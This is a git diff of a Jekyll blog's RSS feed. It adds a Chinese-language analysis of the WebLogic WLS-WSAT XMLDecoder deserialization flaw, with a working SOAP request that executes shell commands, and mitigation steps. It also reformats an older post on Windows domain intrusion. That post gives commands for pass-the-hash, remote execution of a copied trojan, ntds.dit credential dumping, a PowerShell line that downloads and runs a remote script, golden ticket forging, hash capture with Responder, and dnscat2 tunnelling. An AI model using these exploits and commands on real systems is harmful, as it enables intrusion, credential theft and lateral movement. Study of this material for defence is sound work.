@@ -5,9 +5,117 @@
     <description>Something Specail</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Tue, 25 Apr 2017 12:57:30 +0800</pubDate>
-    <lastBuildDate>Tue, 25 Apr 2017 12:57:30 +0800</lastBuildDate>
-    <generator>Jekyll v3.4.2</generator>
+    <pubDate>Sat, 23 Dec 2017 14:25:41 +0800</pubDate>
+    <lastBuildDate>Sat, 23 Dec 2017 14:25:41 +0800</lastBuildDate>
+    <generator>Jekyll v3.6.2</generator>
+    
+      <item>
+        <title>WebLogic WLS-WebServices组件反序列化漏洞分析</title>
+        <description>&lt;p&gt;最近由于数字货币的疯涨，大量机器被入侵后用来挖矿，其中存在不少部署了Weblogic服务的机器，因为Weblogic最近所爆出安全漏洞的exploit在地下广泛流传。回到这个漏洞本身，其原因在于WLS-WebServices这个组件中，因为它使用了XMLDecoder来解析XML数据。有安全研究人员在去年八月份就向官方报告了此漏洞，Oracle官方在今年四月份提供了补丁程序。但是，四月份提供的补丁感觉是在敷衍了事，因此很快就被绕过了。为此官方又只能新发补丁，不过十月份所提供的补丁，检查还是比较严格。下面具体来看看此次反序列漏洞&lt;/p&gt;
+&lt;h2 id=&quot;0x01漏洞复现&quot;&gt;0x01漏洞复现&lt;/h2&gt;
+&lt;p&gt;测试环境 Weblogic 10.3.6.0/jdk1.6.0_45/Linux&lt;/p&gt;
+
+&lt;p&gt;漏洞POC&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /wls-wsat/CoordinatorPortType11 HTTP/1.1
+Host: 127.0.0.1:7001
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
+Upgrade-Insecure-Requests: 1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
+Connection: close
+Content-Type: text/xml
+Content-Length: 777
+
+&amp;lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&amp;gt;  
+  &amp;lt;soapenv:Header&amp;gt; 
+    &amp;lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&amp;gt;  
+      &amp;lt;java&amp;gt; 
+        &amp;lt;void class=&quot;java.lang.ProcessBuilder&quot;&amp;gt; 
+          &amp;lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&amp;gt; 
+            &amp;lt;void index=&quot;0&quot;&amp;gt; 
+              &amp;lt;string&amp;gt;/bin/sh&amp;lt;/string&amp;gt; 
+            &amp;lt;/void&amp;gt;  
+            &amp;lt;void index=&quot;1&quot;&amp;gt; 
+              &amp;lt;string&amp;gt;-c&amp;lt;/string&amp;gt; 
+            &amp;lt;/void&amp;gt;  
+            &amp;lt;void index=&quot;2&quot;&amp;gt; 
+              &amp;lt;string&amp;gt;id &amp;gt; /tmp/chaitin&amp;lt;/string&amp;gt;
+            &amp;lt;/void&amp;gt; 
+          &amp;lt;/array&amp;gt;  
+          &amp;lt;void method=&quot;start&quot;/&amp;gt; 
+        &amp;lt;/void&amp;gt; 
+      &amp;lt;/java&amp;gt; 
+    &amp;lt;/work:WorkContext&amp;gt; 
+  &amp;lt;/soapenv:Header&amp;gt;  
+  &amp;lt;soapenv:Body/&amp;gt; 
+&amp;lt;/soapenv:Envelope&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-12-23-15139326533815.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-12-23-15139326768139.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x02漏洞分析&quot;&gt;0x02漏洞分析&lt;/h2&gt;
+&lt;p&gt;此次漏洞出现在wls-wsat.war中，此组件使用了weblogic自带的webservices处理程序来处理SOAP请求。然后在&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;weblogic.wsee.jaxws.workcontext.WorkContextServerTube
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;类中获取XML数据传递给XMLDecoder来解析。&lt;/p&gt;
+
+&lt;p&gt;解析XML的调用链为&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest
+
+weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld
+
+weblogic.wsee.workarea.WorkContextXmlInputAdapter
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;首先看到weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest方法
+&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-12-23-15139338809033.jpg&quot; alt=&quot;&quot; /&gt;
+获取到localHeader1后传递给readHeaderOld方法，其内容为&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;work:WorkContext&amp;gt;&lt;/code&gt;所包裹的数据，然后继续跟进weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld方法
+&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-12-23-15139340157538.jpg&quot; alt=&quot;&quot; /&gt;
+在此方法中实例化了WorkContextXmlInputAdapter类，并且将获取到的XML格式的序列化数据传递到此类的构造方法中，最后通过XMLDecoder来进行反序列化操作。
+&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-12-23-15139341082935.jpg&quot; alt=&quot;&quot; /&gt;
+关于XMLDecoder的反序化问题13年就已经被人发现，近期再次被利用到Weblogic中由此可见JAVA生态圈中的安全问题是多么糟糕。值得一提的是此次漏洞出现了两处CVE编号，因为在Oracle官方在修复CVE-2017-3506所提供的patch只是简单的检查了XML中是否包含了&lt;object&gt;节点，然后将&lt;object&gt;换为&lt;void&gt;即可绕过此补丁。因此在修复过程中用户一定要使用Oracle官方十月份所提供的patch。&lt;/void&gt;&lt;/object&gt;&lt;/object&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x03漏洞防御&quot;&gt;0x03漏洞防御&lt;/h2&gt;
+&lt;ol&gt;
+  &lt;li&gt;临时解决方案
+根据业务所有需求，考虑是否删除WLS-WebServices组件。包含此组件路径为：&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat
+
+Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war
+
+Middleware/wlserver_10.3/server/lib/wls-wsat.war
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;以上路径都在WebLogic安装处。删除以上文件之后，需重启WebLogic。确认http://weblogic_ip/wls-wsat/ 是否为404页面。&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;官方补丁修复
+前往Oracle官网下载10月份所提供的安全补丁。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;0x04-参考资料&quot;&gt;0x04 参考资料&lt;/h2&gt;
+&lt;p&gt;http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html&lt;/p&gt;
+
+&lt;p&gt;https://github.com/pwntester/XMLDecoder&lt;/p&gt;
+
+</description>
+        <pubDate>Fri, 22 Dec 2017 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/vulnerability/analysis/2017/12/22/WebLogic-WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</link>
+        <guid isPermaLink="true">http://localhost:4000/vulnerability/analysis/2017/12/22/WebLogic-WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</guid>
+        
+        <category>vulnerability analysis</category>
+        
+        
+        <category>vulnerability</category>
+        
+        <category>analysis</category>
+        
+      </item>
     
       <item>
         <title>windows内网渗透杂谈</title>
@@ -33,7 +141,7 @@
 &lt;h3 id=&quot;域信息收集&quot;&gt;域信息收集&lt;/h3&gt;
 &lt;h4 id=&quot;0x01-查询当前域信息&quot;&gt;0x01 查询当前域信息&lt;/h4&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net view /domain
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net view /domain
 net config workstation
 net group &quot;Domain Admins&quot; /domain
 net time /domain
@@ -52,8 +160,7 @@ dsquery computer
 
 net group &quot;Domain Computers&quot; /domain
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816910178725.jpg&quot; alt=&quot;&quot; /&gt;
 &lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816926950901.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -64,9 +171,8 @@ net group &quot;Domain Computers&quot; /domain
 &lt;p&gt;powerview Get-NetDomainController  收集域控信息
 具体的可以看看powerview的帮助文件
 域内服务信息收集，在域环境中其实无需做端口扫描。直接通过SPN进行信息收集，具体脚本&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PowerShell-AD-Recon/blob/master/Discover-PSInterestingServices.ps1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PowerShell-AD-Recon/blob/master/Discover-PSInterestingServices.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816932370016.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h4 id=&quot;0x02域内权限获取&quot;&gt;0x02域内权限获取&lt;/h4&gt;
@@ -78,9 +184,8 @@ net group &quot;Domain Computers&quot; /domain
 
 &lt;p&gt;3.pass the hash 抓到密码破不出来就只能pth了，可以使用mimakatz&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;但是打了KB2871997这个补丁后常规的pth不能用了，只能传递administrator这个账号(sid=500),但是可以使用mimikatz任意传递aes256&lt;/p&gt;
 
@@ -89,49 +194,43 @@ net group &quot;Domain Computers&quot; /domain
 &lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816940742419.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;5.远程执行命令方法&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;copy muma.exe \\host\c$\windows\temp\foobar.exe ##IPC拷贝木马文件
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;copy muma.exe \\host\c$\windows\temp\foobar.exe ##IPC拷贝木马文件
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;WMIC远程运行命令&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 wmic /node:host /user:administrator /p 密码 process call create “c:\windows\temp\foobar.exe”
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;powershell remoting 执行命令&lt;/p&gt;
 
 &lt;p&gt;schtasks计划任务远程运行&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe
 /sc once /st 00:00 /S host /RU System schtasks /run /tn foobar /S host
 schtasks /F /delete /tn foobar /S host ##清除schtasks
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;SC添加服务远程运行命令&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sc \\host create foobar binpath=“c:\windows\temp\foobar.exe” ##新建服务,指向拷贝的木马路径
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sc \\host create foobar binpath=“c:\windows\temp\foobar.exe” ##新建服务,指向拷贝的木马路径
 sc \\host start foobar ##启动建立的服务
 sc \\host delete foobar ##完事后删除服务
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;PStools 远程执行命令&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;psexec.exe \\ip –accepteula -u username -p password program.exe
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;psexec.exe \\ip –accepteula -u username -p password program.exe
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;PTH+compmgmt.msc
 &lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816949000256.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;smb+MOF&lt;/p&gt;
 
 &lt;p&gt;smbexec远程执行命令&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;copy execserver.exe \\host\c$\windows\ 
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;copy execserver.exe \\host\c$\windows\ 
 test.exe ip user password command netshare
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;不推荐使用pstools，因为会留下很多痕迹，日志要记录，并且如果禁用NTLM那么psexec无法利用获得的ntlm hash进行远程连接&lt;/p&gt;
 
 &lt;p&gt;6.ms14068 &amp;amp;&amp;amp; GPP
@@ -144,16 +243,15 @@ QuarkPwDump离线分析
 需要文件：ntds.dit system.hiv
 导出 system.hiv&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reg save hklm\system system.hiv
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reg save hklm\system system.hiv
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;QuarksPwDump.exe -k  可以获取key&lt;/p&gt;
 
 &lt;p&gt;导出ntds.dit&lt;/p&gt;
 
 &lt;p&gt;连接到域控之后，上传bat 利用vshadow备份ntds.dit&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;setlocal
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;setlocal
 if NOT &quot;%CALLBACK_SCRIPT%&quot;==&quot;&quot; goto :IS_CALLBACK
 set SOURCE_DRIVE_LETTER=%SystemDrive%
 set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit
@@ -171,40 +269,34 @@ setlocal
 call %TEMP_GENERATED_SCRIPT%
 @echo ...Copying from the shadow copy to the destination path...
 copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;新建服务执行&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sc create backupntds binPath= &quot;cmd /c start c:\windows\temp\ntds.bat&quot;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sc create backupntds binPath= &quot;cmd /c start c:\windows\temp\ntds.bat&quot;
 sc start backupntds
 sc detele backupntds
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;导出HASH&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QuarksPwDump.exe -dhd -nt ntds.dit -sf system.hiv -o hash.txt
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QuarksPwDump.exe -dhd -nt ntds.dit -sf system.hiv -o hash.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;ntdsutil导出&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit
 ntdsutil snapshot &quot;mount {GUID}&quot; quit quit
 copy MOUNT_POINT\windows\ntds\ntds.dit c:\windows\temp\ntds.dit
 ntdsutil snapshot &quot;unmount {GUID}&quot; quit quit
 ntdsutil snapshot &quot;delete {GUID}&quot; quit quit
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;powershell 导出ntds.dit&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell IEX (New-ObjectNet.WebClient).DownloadString( 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1');Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Users\Administrator\Desktop\ntds.dit&quot;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell IEX (New-ObjectNet.WebClient).DownloadString( 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1');Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Users\Administrator\Desktop\ntds.dit&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;powershell导出后需要修复一下&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esentutl /p /o ntds.dit
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esentutl /p /o ntds.dit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;ol&gt;
   &lt;li&gt;交互式&lt;/li&gt;
@@ -220,23 +312,20 @@ ntdsutil snapshot &quot;delete {GUID}&quot; quit quit
 golden ticket 四要素&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user 用户名
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user 用户名
 domain 域完整名称
 sid   获取方式:whoami /all  powerview 里面的  Convert-NameToSid ESRINEA\administrator   psgetsid  -accepteula ESRINEA\administrator (PStoos存在)   mimikatz SID::lookup name
 krbgt ntml hash   mimikatz “@lsadump::dcsync /domain:域完整名称 /user:krbtgt&quot;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;保存golden ticket&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz kerberos::golden /user:administrator /domain:ESRINEA.LOCAL /sid:S-1-5-21-2609584263-878513794-3710365111-500 /krbtgt:EDC094659D9C18F4E320C70838404D43 /ticket:ESRINEA.LOCAL.kirbi
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz kerberos::golden /user:administrator /domain:ESRINEA.LOCAL /sid:S-1-5-21-2609584263-878513794-3710365111-500 /krbtgt:EDC094659D9C18F4E320C70838404D43 /ticket:ESRINEA.LOCAL.kirbi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;使用golden ticket&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz keberos::ptt ESRINEA.LOCAL.kirbi
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz keberos::ptt ESRINEA.LOCAL.kirbi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14817917650651.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -265,9 +354,8 @@ Skeleton Key被安装在64位的域控服务器上，支持Windows Server2003—
 &lt;p&gt;&lt;a href=&quot;https://github.com/SpiderLabs/Responder&quot;&gt;https://github.com/SpiderLabs/Responder&lt;/a&gt;
 撸下内网一个网站挂上&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img src=\\xxx\\xx&amp;gt;&lt;/code&gt;然后执行下面命令，就可以抓取ntlmv2 hash&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./Responder.py -I eth0 -rPv
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./Responder.py -I eth0 -rPv
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816996917145.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;SMBRelay Attack&lt;/p&gt;
@@ -298,33 +386,30 @@ impacket&lt;/p&gt;
 
 &lt;p&gt;测试环境&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ubuntu 14.04 root用户
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ubuntu 14.04 root用户
 windows7 x64 user用户
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;0x01环境准备&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get update
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get update
 apt-get -y install ruby-dev git make g++
 gem install bundler
 git clone https://github.com/iagox86/dnscat2.git
 cd dnscat2/server
 #修改Gemfile source 'https://ruby.taobao.org/'
 bundle install
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;或者通过docker安装&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install docker.io
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install docker.io
 service docker status
 service docker start
 cd ~/dnscat2/server
 #修改Gemfile source 'https://ruby.taobao.org/'
 docker build .
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;安装完成之后，可能在docker images 看到这个镜像没有名字，我们修改一下 docker tag IMAGEID  mpercival/dnscat2&lt;/p&gt;
 
@@ -332,11 +417,10 @@ docker build .
 
 &lt;p&gt;server端&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd dnscat2/server
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd dnscat2/server
 ruby ./dnscat2.rb
 #docker用户  docker run -p 53:53/udp -it --rm mpercival/dnscat2 ruby ./dnscat2.rb
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
